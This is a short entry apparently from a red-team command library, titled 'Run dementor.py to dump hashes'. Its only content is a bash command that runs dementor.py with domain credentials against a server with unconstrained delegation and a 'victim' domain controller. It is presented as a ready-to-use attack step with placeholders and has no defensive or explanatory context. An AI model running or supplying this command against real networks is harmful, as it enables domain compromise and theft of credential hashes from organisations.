---
id: cd380fe2-5c0a-446d-89fa-dabc41a45819
name: Run dementor.py to dump hashes
type: command
executor: bash
data: python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME>
  <VICTIM-DC-NAME>
output: null
created_at: '2023-04-06T03:56:07.549352+00:00'
updated_at: '2023-04-10T20:26:11.213305+00:00'
---

# Run dementor.py to dump hashes

```bash
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```


